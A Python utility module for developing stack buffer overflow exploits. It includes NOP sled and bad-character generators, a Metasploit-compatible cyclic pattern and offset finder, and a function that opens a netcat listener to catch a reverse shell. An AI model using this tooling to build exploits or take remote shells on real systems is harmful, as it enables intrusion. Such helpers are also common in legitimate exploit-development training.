#!/usr/bin/env python3
import socket
import struct


nop_sled_16 = "\x90"*16        # 16 byte NOP sled if needed
sub_esp_10= "\x83\xec\x10"  # sub esp,0x10 (drop esp back to 16 bytes)
shell_process = None

# These are useful methods for testing purposes while develop an exploit
def encode(string):
    return string.encode(encoding='latin-1')    # Encoding the given string to Latin-1 type byze array
def decode(bytearr):
    return bytearr.decode(encoding='latin-1')   # Decoding the given byte array to Latin-1 encoded string 
def generate_bctest(badchars=['0x00']):
    """
    This function will generate character array for bad char identification.
    """
    
    bctest = ""     # the returnes string
    for i in range(0x00,0xFF+1):       # python range 0 - 255 (+1 is need for 255)
        if i not in badchars:
            bctest += chr(i)            # Add character to string ii it is not a known bad char
    with open('bctest.bin','wb') as f:  
        f.write(encode(bctest))         # write the result into a binary (required for mona)
    return bctest                       # return the resulted string
def generate_pattern(plength):
    """
    This function will generate unique cyclic string for EIP identification.
    The result is the same of msf-pattern_create. The result works with msf-pattern_offset.
    """
    
    pattern = ""        # The result pattern string
    i = 0               # counter for numbers
    j = 0               # counter for lower alphabet
    k = 0               # counter for Uppel Letters
    while len(pattern)<plength:
        pattern += _get_next_pattern_string(i,j,k)  # Generate the next pattern element
        i += 1
        if i == 10:
            i = 0
            j += 1
            if j == 26:
                j= 0
                k+=1
    if len(pattern)>plength:
        pattern = pattern[:plength] # Split the pattern to the correct size
        return pattern          # return pattern
    elif len(pattern)==plength:
        return pattern

def _get_next_pattern_string(i,j,k):
    alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] # alphabet
    return alphabet[k].upper()+alphabet[j]+str(i)   # generate pattern element from the given parameters, and return it.


def get_pattern_offset(length, EIP):
    """
    This modul will determine the offset of the given EPI stored value.
    The function is fully compatible with msf-pattern_create. The functionality is similar to msf-pattern_offset
    """
    
    ba = bytearray.fromhex(EIP) # create a byte array from EIP stored HEX code
    ba.reverse()                # reverse if because Little Endian
    eip = ba.decode(encoding='latin-1') # Get the result string from decode
    pattern = generate_pattern(length)  # generate a given length of pattern
    a = pattern.find(eip)               # find the given EIP value in the generated pattern
    if a > 0:
        print(f"Offset found near: {str(a)}")
    else:
        print(f"No Sequence found: {eip} ({EIP})")
    return a
    
    
def generate_nop_sled(length):
    if length > 0:
        return '\x90'*length    # generate a spaecified length NOP sled
    else:
        return ''




def spawn_rev_shell(port):
    global shell_process
    from subprocess import Popen
    #from threading import Thread
    shell_process = Popen(f"nc -lnvp {str(port)}",shell=True)
    shell_process.communicate()
    